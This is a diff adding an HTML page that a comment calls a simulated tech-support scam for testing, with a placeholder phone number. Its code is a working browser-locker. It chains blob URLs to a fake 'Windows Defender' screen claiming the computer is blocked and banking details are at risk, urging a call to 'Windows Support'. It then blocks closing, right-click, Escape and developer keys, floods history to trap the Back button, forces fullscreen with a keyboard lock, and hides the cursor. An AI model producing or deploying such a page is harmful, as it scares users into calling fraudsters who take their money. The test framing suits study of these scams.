@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<!--
+  Simulated scam with further layers of trapping on top of the base technique.
+  For testing only; the number is a fictional placeholder.
+
+  - a blob: document that immediately replaces itself with a second blob: document
+  - beforeunload registered in the capture phase, so it cannot be pre-empted
+  - Back button trap: history is flooded and popstate pushes the user forward again
+  - the first click or key press goes fullscreen and locks the keyboard (Esc included)
+  - cursor hidden
+-->
+<html lang="en">
+<head><meta charset="utf-8" /><title>Loading...</title></head>
+<body>
+<script>
+  const lockScreen = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="utf-8" /><title>Windows Defender Security Center</title>
+      <style>
+        html, body { margin: 0; height: 100%; cursor: none; }
+        body { font-family: Arial, sans-serif; background: #002bff; color: #fff;
+               display: flex; align-items: center; justify-content: center; text-align: center; }
+      </style>
+    </head>
+    <body>
+      <div>
+        <h1>Windows has been blocked due to suspicious activity</h1>
+        <p>Do not close this window or restart your computer. Your banking details are at risk.</p>
+        <p>Call Windows Support: <b>1-844-555-0111</b> (toll free)</p>
+      </div>
+      <script>
+        window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; }, true);
+        window.addEventListener('contextmenu', (e) => e.preventDefault(), true);
+        window.addEventListener('keydown', (e) => {
+          if (['F5', 'F11', 'F12', 'Escape'].includes(e.key) || e.ctrlKey || e.altKey) e.preventDefault();
+        }, true);
+
+        for (let i = 0; i < 30; i++) history.pushState({ i }, '', location.href);
+        window.addEventListener('popstate', () => history.pushState({}, '', location.href));
+
+        const takeOver = () => {
+          document.documentElement.requestFullscreen().then(() => {
+            if (navigator.keyboard && navigator.keyboard.lock) navigator.keyboard.lock();
+          }).catch(() => {});
+        };
+        document.addEventListener('click', takeOver);
+        document.addEventListener('keydown', takeOver);
+      <\/script>
+    </body>
+    </html>
+  `;
+
+  // Layer 1: a blob whose only job is to hop to the real lock-screen blob.
+  const hop = `
+    <!DOCTYPE html>
+    <html><head><meta charset="utf-8" /><title>Please wait</title></head>
+    <body>
+      <script>
+        const next = new Blob([${JSON.stringify(lockScreen).replace(/<\/script>/g, '<\\/script>')}], { type: 'text/html' });
+        location.replace(URL.createObjectURL(next));
+      <\/script>
+    </body></html>
+  `;
+  window.location.href = URL.createObjectURL(new Blob([hop], { type: 'text/html' }));
+</script>
+</body>
+</html>
